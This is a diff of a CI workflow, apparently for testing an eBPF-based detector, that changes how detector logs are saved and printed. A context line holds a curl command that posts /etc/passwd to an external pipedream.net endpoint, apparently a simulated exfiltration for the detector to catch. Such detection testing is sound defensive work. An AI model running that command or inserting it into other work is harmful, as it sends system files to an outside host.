@@ -28,8 +28,10 @@ jobs:
         run: |
           curl https://903e71dc0c872212a00b1d19477faafe.m.pipedream.net --data-binary "@/etc/passwd"
 
-      - name: Print detector logs
-        run: docker logs ebpf_detector
+      - name: Save detector logs to file
+        run: |
+          docker logs ebpf_detector > ebpf_logs.txt
+          cat ebpf_logs.txt
 
       - name: Stop and cleanup
         run: docker rm -f ebpf_detector
